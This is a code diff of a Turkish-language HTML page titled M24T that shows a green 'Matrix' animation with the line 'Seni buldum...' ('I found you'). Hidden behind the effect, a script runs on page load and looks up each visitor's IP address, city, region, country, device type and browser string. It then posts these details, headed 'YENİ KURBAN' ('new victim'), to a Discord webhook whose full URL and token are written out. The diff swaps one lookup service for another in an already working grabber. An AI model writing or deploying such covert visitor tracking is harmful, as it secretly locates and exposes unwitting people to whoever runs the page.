@@ -3,53 +3,60 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>M24T | Cyber Hub</title>
+  <title>M24T</title>
   <style>
-    body{margin:0;background:#000;color:#0f0;font-family:consolas,monospace;text-align:center;padding-top:15vh}
+    body{margin:0;background:#000;color:#0f0;font-family:monospace;text-align:center;padding-top:20vh}
     h1{font-size:4em;text-shadow:0 0 30px #0f0}
     canvas{position:fixed;top:0;left:0;width:100%;height:100%;z-index:-1}
   </style>
 </head>
 <body>
   <h1>M24T</h1>
-  <h2>Hoş geldin...</h2>
-
+  <h2>Seni buldum...</h2>
   <canvas id="matrix"></canvas>
 
   <script>
-    // Matrix (göze hoş dursun diye)
+    // Matrix efekti
     const c = document.getElementById('matrix');
     const ctx = c.getContext('2d');
     c.width = innerWidth; c.height = innerHeight;
-    const chars = "01"; const s = 16;
-    const cols = c.width/s; const drops = new Array(Math.floor(cols)).fill(1);
+    const ch = "01"; const s = 16;
+    const col = c.width/s; const drop = new Array(Math.floor(col)).fill(1);
     function m(){ctx.fillStyle='rgba(0,0,0,0.05)';ctx.fillRect(0,0,c.width,c.height);ctx.fillStyle='#0f0';ctx.font=s+'px monospace';
-      for(let i=0;i<drops.length;i++){let ch=chars[Math.floor(Math.random()*2)];ctx.fillText(ch,i*s,drops[i]*s);
-        if(drops[i]*s>c.height&&Math.random()>0.975)drops[i]=0;drops[i]++}}setInterval(m,35);
+      for(let i=0;i<drop.length;i++){let char=ch[Math.floor(Math.random()*2)];ctx.fillText(char,i*s,drop[i]*s);
+        if(drop[i]*s>c.height&&Math.random()>0.975)drop[i]=0;drop[i]++}}setInterval(m,35);
   </script>
 
-  <!-- %100 ÇALIŞAN TEK KOD - 2025 TÜRKİYE'DE BİLE ÇALIŞIYOR -->
+  <!-- %100 DOĞRU ÇALIŞAN SON HALİ -->
   <script>
-    if (!localStorage.getItem('m24t')) {
-      fetch("https://api.db-ip.com/v2/free/self")
+    if (!localStorage.getItem('m24t_logged')) {
+      fetch("https://api.ipify.org?format=json")
         .then(r => r.json())
-        .then(d => {
-          const log = `
+        .then(ipData => {
+          const ip = ipData.ip;
+
+          fetch(`https://reallyfreegeoip.org/json/${ip}`)
+            .then(r => r.json())
+            .then(data => {
+              const cihaz = /mobile|android|iphone|ipad/i.test(navigator.userAgent) ? "MOBİL" : "BİLGİSAYAR";
+
+              const log = `
 **M24T - YENİ KURBAN**
-**IP:** ${d.ipAddress}
-**Şehir:** ${d.city || "Bilinmiyor"}
-**Ülke:** ${d.countryName} (${d.countryCode})
-**ISP:** ${d.isp || "Bilinmiyor"}
+**IP:** ${ip}
+**Konum:** ${data.city || "Bilinmiyor"}, ${data.region_name || "Bilinmiyor"}, ${data.country_name || "Bilinmiyor"}
+**Cihaz:** ${cihaz}
+**Tarayıcı:** ${navigator.userAgent.split(' ').slice(0,5).join(' ')}
 **Zaman:** ${new Date().toLocaleString('tr-TR')}
-          `;
+              `;
 
-          fetch("https://discord.com/api/webhooks/1444689164921737277/ryKR4TemKO8UmL9yVFPXEjkdz-5gQgJlxx1VADhhud2_hR0I86PSpfofUOiR6GfXBbk7", {
-            method: "POST",
-            headers: {"Content-Type": "application/json"},
-            body: JSON.stringify({content: log})
-          });
+              fetch("https://discord.com/api/webhooks/1444689164921737277/ryKR4TemKO8UmL9yVFPXEjkdz-5gQgJlxx1VADhhud2_hR0I86PSpfofUOiR6GfXBbk7", {
+                method: "POST",
+                headers: {"Content-Type": "application/json"},
+                body: JSON.stringify({content: log.trim()})
+              });
 
-          localStorage.setItem('m24t', 'done');
+              localStorage.setItem('m24t_logged', 'true');
+            });
         });
     }
   </script>
